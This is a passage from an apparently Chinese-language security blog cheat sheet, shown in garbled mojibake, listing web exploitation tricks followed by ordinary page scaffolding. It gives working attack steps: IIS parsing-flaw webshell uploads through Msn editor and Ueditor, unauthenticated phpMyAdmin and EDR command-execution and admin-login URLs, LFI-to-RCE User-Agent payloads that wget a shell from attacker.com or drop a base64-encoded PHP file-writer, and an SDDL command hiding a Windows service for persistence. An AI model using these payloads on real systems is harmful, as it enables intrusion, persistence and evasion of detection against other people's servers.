åˆ©ç”¨IISè§£ææ¼æ´æ‹¿SHELLã€‚ä¸Šä¼ åSHELLçš„è·¯å¾„ä¸ºhttp://www.xxxx.com/images/x.asp;.jpg
</code></pre>
<h3 id="Msn-editor"><a href="#Msn-editor" class="headerlink" title="Msn editor"></a>Msn editor</h3><pre><code>åˆ©ç”¨WIN 2003 IISæ–‡ä»¶åç§°è§£ææ¼æ´è·å¾—SHELL
å½±å“ç‰ˆæœ¬ï¼šæœªçŸ¥
è„†å¼±æè¿°ï¼š
ç‚¹å‡»å›¾ç‰‡ä¸Šä¼ åä¼šå‡ºç°ä¸Šä¼ é¡µé¢ï¼Œåœ°å€ä¸º
http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=
ç”¨æ™®é€šçš„å›¾ç‰‡ä¸Šä¼ åï¼Œåœ°å€ä¸º
http://www.xxxx.com/news/uppic/41513102009204012_1.gif
è®°ä½è¿™æ—¶å€™çš„è·¯å¾„ï¼Œå†ç‚¹å‡»å›¾ç‰‡çš„ä¸Šä¼ ï¼Œè¿™æ—¶å€™åœ°å€å°±å˜æˆäº†
http://www.xxxx.com/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012
å¾ˆæ˜æ˜¾ã€‚å›¾ç‰‡çš„åœ°å€æ˜¯æ ¹æ®RemNumåé¢çš„ç¼–å·ç”Ÿæˆçš„ã€‚
æ”»å‡»åˆ©ç”¨:
é…åˆIISçš„è§£ææ¼æ´ï¼ŒæŠŠRemNumåé¢çš„æ•°æ®ä¿®æ”¹ä¸º1.asp;41513102009204012ï¼Œå˜æˆä¸‹é¢è¿™ä¸ªåœ°å€
http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012
ç„¶ååœ¨æµè§ˆå™¨é‡Œæ‰“å¼€ï¼Œç„¶åé€‰æ‹©ä½ çš„è„šæœ¬æœ¨é©¬ä¸Šä¼ ï¼Œå°†ä¼šè¿”å›ä¸‹é¢çš„åœ°å€
uppic/1.asp;41513102009204012_2.gif
ç›´æ¥æ‰“å¼€æ˜¯å°é©¬åœ°å€ï¼
</code></pre>
<h3 id="Ueditor"><a href="#Ueditor" class="headerlink" title="Ueditor"></a>Ueditor</h3><pre><code>1.4.3.3 .netç‰ˆæœ¬
&lt;form action=&quot;http://xx.com/ueditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot;&gt;
&lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p&gt;
&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
&lt;/form&gt;
åŠ è½½ä¸€ä¸ªè¿œç¨‹å›¾ç‰‡shell
è¡¨å•åœ¨è¿œç¨‹å›¾ç‰‡ååŠ ?.aspx
å¦‚ http://1.1.1.1/uploads/1.gif?.aspx
</code></pre>
<h2 id="å®å¡”é¢æ¿æœªæˆæƒè®¿é—®phpmyadmin"><a href="#å®å¡”é¢æ¿æœªæˆæƒè®¿é—®phpmyadmin" class="headerlink" title="å®å¡”é¢æ¿æœªæˆæƒè®¿é—®phpmyadmin"></a>å®å¡”é¢æ¿æœªæˆæƒè®¿é—®phpmyadmin</h2><pre><code>å®å¡”Linuxé¢æ¿7.4.2ç‰ˆæœ¬
å®å¡”Linuxæµ‹è¯•ç‰ˆ7.5.13
Windowsé¢æ¿6.8ç‰ˆæœ¬
ç›´æ¥è®¿é—®http://your_ip:888/pma
</code></pre>
<h2 id="æ·±xæœ"><a href="#æ·±xæœ" class="headerlink" title="æ·±xæœ"></a>æ·±xæœ</h2><pre><code>EDR RCE
https://ip+ç«¯å£/tool/log/c.php?strip_slashes=system&amp;host=id å³å¯æ‰§è¡Œå‘½ä»¤
ç»ˆç«¯æ£€æµ‹å“åº”å¹³å°ä»»æ„ç”¨æˆ·ç™»å½•
fofa: title=&quot;ç»ˆç«¯æ£€æµ‹å“åº”å¹³å°&quot;
target+/ui/login.php?user=admin å³å¯ç›´æ¥ç™»å½•
</code></pre>
<h2 id="å¤©rä¿¡"><a href="#å¤©rä¿¡" class="headerlink" title="å¤©rä¿¡"></a>å¤©rä¿¡</h2><pre><code>é»˜è®¤ç”¨æˆ·supermançš„uid=1
POST /?module-auth_user&amp;action=mod_edit.pwd HTTP/1.1
</code></pre>
<h2 id="ä»LFIåˆ°RCE"><a href="#ä»LFIåˆ°RCE" class="headerlink" title="ä»LFIåˆ°RCE"></a>ä»LFIåˆ°RCE</h2><pre><code>å½“æœ‰ä¸ªlfiæ—¶
https://www.website.com/index.php?pg=../../../../etc/passwd
å°è¯•åŒ…å«/proc/self/environ
https://www.website.com/index.php?pg=../../../../proc/self/environ
è‹¥æ˜¯å­˜åœ¨user-agentæ ‡è¯†
ä¿®æ”¹uaæ¥å®ç°rce:
User-Agent: &lt;?system(&#39;wget http://attacker.com/shell.txt -O shell.php&#39;);?&gt;
User-Agent: &lt;?exec(&#39;wget http://attacker.com/shell.txt -O shell.php&#39;);?&gt;
User-Agent: &lt;?php phpinfo(); ?&gt;
ä¹Ÿå¯ä»¥åœ¨æœåŠ¡å™¨å†…éƒ¨æ¥åˆ›å»ºæ–‡ä»¶å†™å…¥shell
User-Agent: &lt;?php $a = base64_decode(&#39;PD9waHAgCiAgJGEgPSAkX1BPU1RbJ2NvZGUnXTsKICAkZmlsZSA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwndycpOwogIEBmd3JpdGUoJGZpbGUsJGEpOwogIEBmY2xvc2UoJGZpbGUpOwo/Pgo8Y2VudGVyPgogIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcm0iPgogICAgPGgyPkZpbGUgV3JpdGVyPC9oMj4KICAgIEZpbGUgTmFtZTxicj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSIgcGxhY2Vob2xkZXI9InNoZWxsLnBocCI+PGJyPgogICAgU2hlbGwgQ29kZTxicj48dGV4dGFyZWEgbmFtZT0iY29kZSIgZm9ybT0iZm9ybSIgcGxhY2Vob2xkZXI9IlBhc3RlIHlvdXIgc2hlbGwgaGVyZSI+PC90ZXh0YXJlYT48YnI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iV3JpdGUiPgogIDwvZm9ybT4KPC9jZW50ZXI+Cg==&#39;); $file = fopen(&#39;shell.php&#39;,&#39;w&#39;); echo fwrite($file,$a); fclose($file); ?&gt;
</code></pre>
<h2 id="éšè—windowsæœåŠ¡"><a href="#éšè—windowsæœåŠ¡" class="headerlink" title="éšè—windowsæœåŠ¡"></a>éšè—windowsæœåŠ¡</h2><pre><code>Translate from: https://www.sans.org/blog/red-team-tactics-hiding-windows-services/
Windowsçš„ä¸€ä¸ªåŠŸèƒ½å…è®¸çº¢é˜Ÿæˆ–æ”»å‡»è€…å°†æœåŠ¡éšè—èµ·æ¥ï¼Œä»è€Œä¸ºé€ƒé¿åŸºäºä¸»æœºçš„å¸¸è§å¨èƒæœå¯»æŠ€æœ¯çš„æ£€æµ‹æä¾›äº†æœºä¼šã€‚
è¿™é‡Œå‡è®¾FaxæœåŠ¡æ˜¯æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶æˆ–åé—¨
æ‰“å¼€services.mscå¯ä»¥çœ‹åˆ°æœåŠ¡
</code></pre>
<p><img src="./img/849.png" alt="image"></p>
<pre><code>æ‰§è¡Œå‘½ä»¤å¯ä»¥çœ‹åˆ°æœåŠ¡
</code></pre>
<p><img src="./img/850.png" alt="image"></p>
<pre><code>ç®¡ç†å‘˜æƒé™ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå®‰å…¨æ ‡è¯†ç¬¦å®šä¹‰è¯­è¨€(SDDL)
</code></pre>
<p><img src="./img/851.png" alt="image"></p>
<pre><code>&amp; $env:SystemRoot\System32\sc.exe sdset SWCUEngine &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;
</code></pre>
<p><img src="./img/852.png" alt="image"></p>
<pre><code>å¯ä»¥çœ‹åˆ°å·²ç»æŸ¥è¯¢ä¸åˆ°äº†
</code></pre>
<p><img src="./img/853.png" alt="image"></p>
<pre><code>åœ¨çº¢é˜Ÿæˆ–æ¸—é€æµ‹è¯•ä¸­ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ç§æœ‰ç”¨çš„æŠ€æœ¯ï¼Œå¯ä»¥åœ¨å—æ„ŸæŸ“ä¸»æœºä¸Šä¿æŒæŒä¹…æ€§ã€‚é‡å¯åï¼Œéšè—çš„æœåŠ¡ä¹Ÿä¼šè‡ªåŠ¨å¯åŠ¨ã€‚
å–æ¶ˆéšè—çš„å‘½ä»¤
&amp; $env:SystemRoot\System32\sc.exe sdset SWCUEngine &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;
</code></pre>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        æ–‡ç« ä½œè€…:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">obelia</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        æ–‡ç« é“¾æ¥:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://obelia.ml/2020/03/10/shellcode-chu-ti-yan/">http://obelia.ml/2020/03/10/shellcode-chu-ti-yan/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        ç‰ˆæƒå£°æ˜:
                    </i>
                </span>
                <span class="reprint-info">
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ¥å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº
                    <a href="/about" target="_blank">obelia</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>å¤åˆ¶æˆåŠŸï¼Œè¯·éµå¾ªæœ¬æ–‡çš„è½¬è½½è§„åˆ™</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">æŸ¥çœ‹</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E9%85%8D%E7%BD%AE/">
                                    <span class="chip bg-color">é…ç½®</span>
                                </a>
                            
                                <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">
                                    <span class="chip bg-color">æœåŠ¡å™¨</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯åˆ†äº«ï¼</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">èµ</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">ä½ çš„èµè¯†æ˜¯æˆ‘å‰è¿›çš„åŠ¨åŠ›</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">æ”¯ä»˜å®</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">å¾® ä¿¡</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/IMG_3091.jpg" class="reward-img" alt="æ”¯ä»˜å®æ‰“èµäºŒç»´ç ">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/IMG_3090.jpg" class="reward-img" alt="å¾®ä¿¡æ‰“èµäºŒç»´ç ">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    
    <div class="livere-card card" data-aos="fade-up">
    <!-- æ¥å¿…åŠ›Cityç‰ˆå®‰è£…ä»£ç  -->
    <div id="lv-container" class="card-content" data-id="city" data-uid="MTAyMC81MzUyNC8yOTk5OA==">
        <script type="text/javascript">
            (function (d, s) {
                let j, e = d.getElementsByTagName(s)[0];
                if (typeof LivereTower === 'function') {
                    return;
                }

                j = d.createElement(s);
                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
                j.async = true;

                e.parentNode.insertBefore(j, e);
            })(document, 'script');
        </script>
        <noscript>ä¸ºæ­£å¸¸ä½¿ç”¨æ¥å¿…åŠ›è¯„è®ºåŠŸèƒ½è¯·æ¿€æ´»JavaScriptã€‚</noscript>
    </div>
    <!-- Cityç‰ˆå®‰è£…ä»£ç å·²å®Œæˆ -->
</div>
    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;ä¸Šä¸€ç¯‡</div>
            <div class="card">
                <a href="/2020/03/10/iterm2-pei-zhi/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="iterm2é…ç½®">
                        
                        <span class="card-title">iterm2é…ç½®</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            ITerm2 é…ç½®
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-10
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            obelia
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E9%85%8D%E7%BD%AE/">
                        <span class="chip bg-color">é…ç½®</span>
                    </a>
                    
                    <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">
                        <span class="chip bg-color">æœåŠ¡å™¨</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                ä¸‹ä¸€ç¯‡&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/02/28/nmap-ming-ling-su-cha/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Nmap å‘½ä»¤é€ŸæŸ¥">
                        
                        <span class="card-title">Nmap å‘½ä»¤é€ŸæŸ¥</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            Nmap å‘½ä»¤è¯¦è§£
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-28
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            obelia
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%B7%A5%E5%85%B7/">
                        <span class="chip bg-color">å·¥å…·</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + 'æ¥æº: obelia<br />'
            + 'æ–‡ç« ä½œè€…: obelia<br />'
            + 'æ–‡ç« é“¾æ¥: <a href="' + url + '">' + url + '</a><br />'
            + 'æœ¬æ–‡ç« è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ï¼Œä»»ä½•å½¢å¼çš„è½¬è½½éƒ½è¯·æ³¨æ˜å‡ºå¤„ã€‚';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- ä»£ç å—åŠŸèƒ½ä¾èµ– -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- ä»£ç è¯­è¨€ -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- ä»£ç å—å¤åˆ¶ -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- ä»£ç å—æ”¶ç¼© -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;ç›®å½•</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC æ‚¬æµ®æŒ‰é’®. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* ä¿®å¤æ–‡ç« å¡ç‰‡ div çš„å®½åº¦. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // åˆ‡æ¢TOCç›®å½•å±•å¼€æ”¶ç¼©çš„ç›¸å…³æ“ä½œ.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2020-2021</span>
            
            <span id="year">2020</span>
            <a href="/about" target="_blank">obelia</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;ç«™ç‚¹æ€»å­—æ•°:&nbsp;<span
                        class="white-color">103.4k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;æ€»è®¿é—®é‡:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;æ€»è®¿é—®äººæ•°:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- è¿è¡Œå¤©æ•°æé†’. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/obelia01" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:obelia.0708@gmali.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tg://obelia0708/" class="tooltipped" target="_blank" data-tooltip="é€šè¿‡TGè”ç³»æˆ‘" data-position="top" data-delay="50">
        <i class="fab fa-telegram"></i>
    </a>









</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;æœç´¢</span>
            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--è…¾è®¯å…”å°å·¢-->
    
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
